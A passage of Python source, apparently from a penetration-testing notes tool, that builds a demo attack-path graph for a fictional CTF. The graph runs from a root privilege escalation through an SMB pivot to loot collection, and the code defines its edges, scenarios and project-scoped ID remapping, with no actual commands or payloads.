            {
                "id": "edge-privesc-obtains-root-session",
                "project_id": project_id,
                "source_id": "action-root-privesc",
                "target_id": "session-root",
                "kind": "obtained",
                "source_step_id": refs["cmd-root-privesc"],
            },
            {
                "id": "edge-www-related-privesc",
                "project_id": project_id,
                "source_id": "session-www",
                "target_id": "action-root-privesc",
                "kind": "related_to",
                "source_step_id": refs["cmd-root-privesc"],
            },
            {
                "id": "edge-root-related-read-root",
                "project_id": project_id,
                "source_id": "session-root",
                "target_id": "action-root-flag",
                "kind": "related_to",
                "source_step_id": refs["cmd-root-flag"],
            },
            {
                "id": "edge-read-root-obtains-root-flag",
                "project_id": project_id,
                "source_id": "action-root-flag",
                "target_id": "loot-root-flag",
                "kind": "obtained",
                "source_step_id": refs["cmd-root-flag"],
            },
            {
                "id": "edge-root-related-read-user",
                "project_id": project_id,
                "source_id": "session-root",
                "target_id": "loot-user-flag",
                "kind": "related_to",
                "source_step_id": refs["cmd-user-flag"],
            },
            {
                "id": "edge-root-related-svc-cred",
                "project_id": project_id,
                "source_id": "session-root",
                "target_id": "action-svc-cred",
                "kind": "related_to",
                "source_step_id": refs["cmd-svc-cred"],
            },
            {
                "id": "edge-svc-cred-obtained",
                "project_id": project_id,
                "source_id": "action-svc-cred",
                "target_id": "credential-svc-backup",
                "kind": "obtained",
                "source_step_id": refs["cmd-svc-cred"],
            },
            {
                "id": "edge-svc-user-related-cred",
                "project_id": project_id,
                "source_id": "user-svc-backup",
                "target_id": "credential-svc-backup",
                "kind": "related_to",
                "source_step_id": refs["cmd-svc-cred"],
            },
            {
                "id": "edge-root-pivots-file01",
                "project_id": project_id,
                "source_id": "session-root",
                "target_id": "host-file01",
                "kind": "pivots_to",
                "source_step_id": refs["cmd-netexec"],
            },
            {
                "id": "edge-cred-auth-file01",
                "project_id": project_id,
                "source_id": "credential-svc-backup",
                "target_id": "service-smb",
                "kind": "authenticates_to",
                "source_step_id": refs["cmd-netexec"],
            },
            {
                "id": "edge-cred-opens-smb-session",
                "project_id": project_id,
                "source_id": "credential-svc-backup",
                "target_id": "session-smb-file01",
                "kind": "opens_session_on",
                "source_step_id": refs["cmd-netexec"],
            },
            {
                "id": "edge-action-validates-smb-session",
                "project_id": project_id,
                "source_id": "action-netexec",
                "target_id": "session-smb-file01",
                "kind": "obtained",
                "source_step_id": refs["cmd-netexec"],
            },
            {
                "id": "edge-session-related-smbclient",
                "project_id": project_id,
                "source_id": "session-smb-file01",
                "target_id": "action-smbclient",
                "kind": "related_to",
                "source_step_id": refs["cmd-smbclient"],
            },
            {
                "id": "edge-smbclient-obtains-loot",
                "project_id": project_id,
                "source_id": "action-smbclient",
                "target_id": "loot-forensic",
                "kind": "obtained",
                "source_step_id": refs["cmd-smbclient"],
            },
            {
                "id": "edge-web-network-file01",
                "project_id": project_id,
                "source_id": "host-web01",
                "target_id": "host-file01",
                "kind": "in_network",
                "source_step_id": refs["cmd-nmap"],
            },
        ]

    def _build_demo_scenarios(
        self,
        project_id: str,
        nodes: list[dict],
        edges: list[dict],
    ) -> list[dict]:
        full_chain_node_ids = [node["id"] for node in nodes]
        full_chain_edge_ids = [edge["id"] for edge in edges]
        pivot_node_ids = [
            "session-root",
            "action-svc-cred",
            "credential-svc-backup",
            "user-svc-backup",
            "action-netexec",
            "host-file01",
            "service-smb",
            "session-smb-file01",
            "action-smbclient",
            "loot-forensic",
        ]
        pivot_edge_ids = [
            "edge-root-related-svc-cred",
            "edge-svc-cred-obtained",
            "edge-svc-user-related-cred",
            "edge-root-pivots-file01",
            "edge-cred-auth-file01",
            "edge-cred-opens-smb-session",
            "edge-action-validates-smb-session",
            "edge-session-related-smbclient",
            "edge-smbclient-obtains-loot",
        ]
        return [
            {
                "id": "scenario-full-chain",
                "project_id": project_id,
                "name": "ACME Jenkins to Root",
                "description": "Full CTF path from recon to root on WEB01 with SMB pivot.",
                "color": "#38bdf8",
                "is_active": True,
                "node_ids": full_chain_node_ids,
                "edge_ids": full_chain_edge_ids,
            },
            {
                "id": "scenario-smb-pivot",
                "project_id": project_id,
                "name": "Post-root SMB Pivot",
                "description": "Credential reuse and loot collection on FILE01.",
                "color": "#f59e0b",
                "is_active": False,
                "node_ids": pivot_node_ids,
                "edge_ids": pivot_edge_ids,
            },
        ]

    def _scope_demo_graph(
        self,
        project_id: str,
        nodes: list[dict],
        edges: list[dict],
        scenarios: list[dict],
    ) -> None:
        node_id_map = {
            node["id"]: _scoped_id(project_id, node["id"])
            for node in nodes
        }

        for node in nodes:
            node["id"] = node_id_map[node["id"]]
            meta = node.get("meta")
            if isinstance(meta, dict):
                node["meta"] = _remap_meta(meta, node_id_map)

        for edge in edges:
            edge["id"] = _scoped_id(project_id, edge["id"])
            edge["source_id"] = node_id_map[edge["source_id"]]
            edge["target_id"] = node_id_map[edge["target_id"]]

        for scenario in scenarios:
            scenario["id"] = _scoped_id(project_id, scenario["id"])
            scenario["node_ids"] = [
                node_id_map[node_id] for node_id in scenario.get("node_ids", [])
            ]
            scenario["edge_ids"] = [
                _scoped_id(project_id, edge_id)
                for edge_id in scenario.get("edge_ids", [])
            ]
